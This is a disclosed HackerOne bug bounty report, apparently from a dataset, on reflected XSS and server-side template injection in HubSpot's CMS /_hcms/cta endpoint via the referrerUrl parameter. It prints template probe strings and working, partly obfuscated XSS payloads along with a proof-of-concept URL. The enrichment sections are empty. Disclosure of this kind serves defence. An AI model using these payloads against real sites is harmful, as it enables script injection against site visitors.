---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '399462'
original_report_id: '399462'
title: Reflected XSS and Server Side Template Injection  in all HubSpot CMSes
team_handle: hubspot
created_at: '2018-01-22T20:29:20.000Z'
disclosed_at: '2018-09-11T16:27:49.487Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 64
tags:
- hackerone
---

# Reflected XSS and Server Side Template Injection  in all HubSpot CMSes

## Metadata

- HackerOne Report ID: 399462
- Weakness: 
- Program: hubspot
- Disclosed At: 2018-09-11T16:27:49.487Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

>Really I don't know why BugCrowd team closed my submission  as `N/A` 
{F337815}

`They mentioned that Not in Scope ?!`

So I reported it again in another submission  But this Time I messaged the Security Company Directly and triaged and Fixed in 2 Days` .

***********************************************************
#Full Poc : 
I was found in this path `/_hcms/cta` so this mean that controlled by Hubspot service ..

The affected Parameter was `?referrerUrl=`


#`First Possible Server Side template injection :` 

Server-side template injection occurs when user-controlled input is embedded into a server-side template, allowing users to inject template directives. This allows an attacker to inject malicious template directives and possibly execute arbitrary code on the affected server.

URL encoded GET input `referrerUrl` was set to `{{7*7}}`

>The response contained the result of the evaluated expression: 49
I tried to exploit it by jinja  Injection But `I failed`  I got 
`Malformed escape pair at index 78: https://www.example.com/content-rendering/v1/public/_hcms/cta?referrerUrl=%7B%for%20c%20in%20%5B1,2,3%5D%20%%7D%7B%7Bc,c,c%7D%7D%7B%%20endfor%20%%7D `
Or
` Illegal character in query at index 81:` 

**********************************************************
#Now Reflected  XSS 

@fransrosen was able to Break out the element  By this Payload 
`{%25+macro+field(x)+%25}www.com{{x}}+<b>ok</b>{%25+endmacro+%25}{{+field(1)%7curlize+}}`

#Poc example : 
https://www.example.com/_hcms/cta?referrerUrl={%25+macro+field(x)+%25}www.com{{x}}+<b>ok</b>{%25+endmacro+%25}{{+field(1)%7curlize+}}

{F337816}

>XSS `Payload` was Awesome :)

`{%25+macro+field()+%25}moc.okok//:ptth//)niamod.tnemucod(trela:tpircsavaj=daolno+gvshttp://http:""//{%25+endmacro+%25}{{+field(1)%7curlize%7creverse%7curlize%7creverse%7curlize%7creverse+}}`

{F337819}

{F337820}

{F337821}



>Report Status : 22/1/2018
HubSpot_Security changed the priority to `P2`
HubSpot_Security rewarded 20 points to you
HubSpot_Security changed the state to Resolved 23/1/2018

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
